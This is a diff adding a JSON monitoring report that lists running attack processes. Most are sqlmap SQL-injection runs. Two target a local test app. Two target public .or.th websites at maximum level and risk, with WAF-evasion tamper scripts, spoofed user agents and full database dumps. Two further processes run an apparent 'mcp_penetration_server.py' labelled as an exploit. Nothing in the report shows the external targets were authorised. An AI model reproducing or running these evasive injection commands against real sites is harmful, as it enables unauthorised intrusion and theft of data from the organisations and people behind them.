@@ -1,0 +1,55 @@
+{
+  "report_time": "2025-10-29T12:47:53.134192",
+  "monitoring_status": "Active",
+  "statistics": {
+    "active_attacks": 0,
+    "total_alerts": 0,
+    "total_processes": 6
+  },
+  "recent_successes": [],
+  "vulnerability_alerts": [],
+  "monitored_processes": [
+    {
+      "pid": 54656,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u http://127.0.0.1:5000/user?id=1 -p id --batch --level=1 --risk=1 --fresh-queries --banner --current-db --tables --dump -D testdb -T users -C id,username,password --limit=3",
+      "target": "http://127.0.0.1:5000/user?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 55628,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -r th1.txt --batch --dbs --crawl 2 --tamper=space2comment --random-agent --level 3 --risk 3",
+      "target": "Unknown",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 67652,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://www.gsb.or.th/csr/sustainable/csr-projects/csr-news/activities/?category=1461 --dbs --batch --level=5 --risk=3 --tamper=charencode,randomcase,space2comment --user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 --headers=X-Requested-With: XMLHttpRequest --delay=2",
+      "target": "https://www.gsb.or.th/csr/sustainable/csr-projects/csr-news/activities/?category=1461",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 73340,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://peacoop.or.th/about?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=6 --time-sec=10",
+      "target": "https://peacoop.or.th/about?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 27232,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    },
+    {
+      "pid": 30964,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    }
+  ]
+}
